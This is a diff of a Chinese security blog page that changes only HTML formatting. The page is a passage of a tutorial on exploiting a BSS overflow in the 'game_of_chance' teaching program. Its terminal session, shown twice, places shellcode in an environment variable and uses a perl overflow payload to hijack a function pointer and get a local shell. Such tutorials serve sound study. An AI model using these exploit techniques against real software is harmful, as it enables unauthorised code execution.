-<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</div><div class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</div><div class="line">                                                          XQh//shh/bin��Q��S��̀</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</div><div class="line">SHELLCODE will be at 0xbffff206</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1260 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 6</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 1250 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0xbffff206</div><div class="line">id</div><div class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
+<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</span><br><span class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</span><br><span class="line">                                                          XQh//shh/bin��Q��S��̀</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</span><br><span class="line">SHELLCODE will be at 0xbffff206</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 1260 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048f15</span><br><span class="line"></span><br><span class="line">####### Pick a Number ######</span><br><span class="line">This game costs 10 credits to play. Simply pick a number</span><br><span class="line">between 1 and 20, and if you pick the winning number, you</span><br><span class="line">will win the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">10 credits have been deducted from your account.</span><br><span class="line">Pick a number between 1 and 20: The winning number is 6</span><br><span class="line">Sorry, you didn&apos;t win.</span><br><span class="line"></span><br><span class="line">You now have 1250 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 1250 credits] -&gt;  </span><br><span class="line">Change user name</span><br><span class="line">Enter your new name: Your name has been changed.</span><br><span class="line"></span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</span><br><span class="line">[You have 1250 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0xbffff206</span><br><span class="line">id</span><br><span class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="external">github repo</a></p>
+<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="noopener">github repo</a></p>
 <h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
 <li>《Hacking the art of exploitation》0x342</li>
 </ul>
@@ -513,8 +511,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/07/格式化字符串漏洞/" rel="next" title="格式化字符串漏洞">
-                <i class="fa fa-chevron-left"></i> 格式化字符串漏洞
+              <a href="/2018/03/18/malloc的系统调用/" rel="next" title="malloc的系统调用">
+                <i class="fa fa-chevron-left"></i> malloc的系统调用
               </a>
             
           </div>
@@ -523,8 +521,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/03/18/malloc的系统调用/" rel="prev" title="malloc的系统调用">
-                malloc的系统调用 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/04/07/格式化字符串漏洞/" rel="prev" title="格式化字符串漏洞">
+                格式化字符串漏洞 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -573,7 +571,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -583,10 +581,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -713,7 +709,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
